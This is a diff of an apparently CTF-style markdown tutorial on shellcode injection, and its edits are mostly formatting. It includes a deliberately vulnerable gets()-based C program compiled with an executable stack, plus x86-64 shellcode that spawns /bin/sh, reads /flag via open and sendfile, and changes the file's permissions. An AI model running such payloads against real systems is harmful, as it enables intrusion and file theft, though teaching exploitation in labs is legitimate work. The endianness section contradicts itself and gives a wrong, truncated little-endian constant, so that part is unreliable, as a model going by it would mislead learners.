@@ -19,44 +19,25 @@ Usually, programmers make mistakes and we use those mistakes to inject our shell
   
 
 ```c
-
 void bye1() { puts("Goodbye!"); }
-
 void bye2() { puts("Farewell!"); }
 
-void hello(char *name, void (*bye_func)())
-
-{
-
-printf("Hello %s!\n", name);
-
-bye_func();
-
+void hello(char *name, void (*bye_func)()){
+	printf("Hello %s!\n", name);
+	bye_func();
 }
 
-int main(int argc, char **argv)
-
-{
-
-char name[1024];
-
-gets(name);
-
-srand(time(0));
-
-if (rand() % 2) hello(bye1, name);
-
-else hello(name, bye2);
-
+int main(int argc, char **argv){
+	char name[1024];
+	gets(name);
+	srand(time(0));
+	if (rand() % 2) hello(bye1, name);
+	else hello(name, bye2);
 }
-
 ```
-
-  
 
 Compile with: `gcc -z execstack -o hello hello.c`
 
-  
 
 In the above code, when the value of `rand()` is even, the `hello()` function will be called with the arguments `name` and `bye2`. But when the value of `rand()` is odd, the `hello()` function will be called with the arguments `bye1` and `name`, which is not correct way to call the hello function. It takes the second parameter as a function pointer, but we are passing a string. This is a classic example of shellcode injection. We can simply use the gets() function to inject our shellcode in the form of crafted input data.
 
@@ -84,36 +65,14 @@ Although we have a set of already avalable shellcodes but still we need to learn
 
 Here is an example of basic shellcode that can spawn a shell.
 
-  
-
 ```asm
-
 mov rax, 59 # this is the syscall number of execve
-
-  
-
 lea rdi, [rip+binsh] # points the first argument of execve at the /bin/sh string below
-
-  
-
 mov rsi, 0 # this makes the second argument, argv, NULL
-
-  
-
 mov rdx, 0 # this makes the third argument, envp, NULL
-
-  
-
 syscall # this triggers the system call
-
-  
-
 binsh: # a label marking where the /bin/sh string is
-
-  
-
 .string "/bin/sh"
-
 ```
 
   
@@ -131,45 +90,27 @@ We can also intersperse arbitrary data in your shellcode:
   
 
 ```asm
-
 .byte 0x48, 0x45, 0x4C, 0x4C, 0x4F # "HELLO"
-
 .string "HELLO" # "HELLO\0"
-
 ```
-
-  
 
 Other ways to embed data:
 
-  
-
 ```asm
-
 mov rbx, 0x0068732f6e69622f # move "/bin/sh\0" into rbx
-
-  
-
 push rbx # push "/bin/sh\0" onto the stack
-
-  
-
 mov rdi, rsp # point rdi at the stack
-
 ```
-
-  
-  
 
 ### Endianness of Data
 
 In computing, endianness is the order in which multi-byte data is stored or retrieved from computer memory. Endianness is primarily expressed as:
 
-- big-endian (BE)
+- **big-endian (BE)**
 
 A big-endian system stores the most significant byte of a word at the smallest memory address (MSB first). Used by MIPS, MC68000 and Internet
 
-- little-endian (LE)
+- **little-endian (LE)**
 
 A little-endian system, in contrast, stores the least-significant byte of a word at the smallest address (LSB first). Used by x86 and ARM
 
@@ -183,31 +124,19 @@ Let us store a 8 byte number 0x1122334455667788 in memory.
 
 When we are writing our shellcode, we need to be aware of the endianness of the data. Endianness is the order in which data is stored in memory. So if we are writing shellcode for a little-endian system, then we need to write our data in reverse order.
 
-  
-
 For example:
 
-  
-
 ```asm
-
 mov rbx, 0x0068732f6e69622f # move "/bin/sh\0" into rbx
-
 ```
-
-  
 
 This code will work on a big-endian system, but on a little-endian system it will need to be written as:
 
   
 
 ```asm
-
 mov rbx, 0x2f62696e2f
-
 ```
-
-  
 
 ### Non-shell shellcode
 
@@ -216,35 +145,22 @@ We can write a shellcode that can do many things other than just spawning a shel
   
 
 ```asm
-
 mov rbx, 0x00000067616c662f # push "/flag" filename
-
 push rbx
-
 mov rax, 2 # syscall number of open
-
 mov rdi, rsp # point the first argument at stack (where we have "/flag")
-
 mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)
-
 syscall # trigger open("/flag", NULL)
 
 mov rdi, 1 # first argument to sendfile is the file descriptor to output to (stdout)
-
 mov rsi, rax # second argument is the file descriptor returned by open
-
 mov rdx, 0 # third argument is the number of bytes to skip from the input file
-
 mov r10, 1000 # fourth argument is the number of bytes to transfer to the output file
-
 mov rax, 40 # syscall number of sendfile
-
 syscall # trigger sendfile(1, fd, 0, 1000)
 
 mov rax, 60 # syscall number of exit
-
 syscall # trigger exit()
-
 ```
 
   
@@ -254,7 +170,6 @@ Similarly, we can write a shellcode that can change the permissions of a file. F
   
 
 ```asm
-
 mov rbx, 0x00000067616c662f # push "/flag" filename
 push rbx
 mov rax, 2 # syscall number of open
@@ -270,7 +185,6 @@ syscall # trigger fchmod(fd, 0x777)
 
 mov rax, 60 # syscall number of exit
 syscall # trigger exit()
-
 ```
 
   
@@ -309,8 +223,6 @@ chmod 777 flag
 ./shellcode.bin
 ```
 
-  
-
 #### Replicating exotic conditions
 
 If we are to replicate exotic conditions in ways that are too hard to do as a preamble for your shellcode, we can build a shellcode loader in C:
@@ -344,8 +256,6 @@ gdb ./shellcode.bin
 - strace
 
 To see if things are working from a high level, we can trace our shellcode with strace:
-
-  
 
 ```bash
 strace ./shellcode.bin
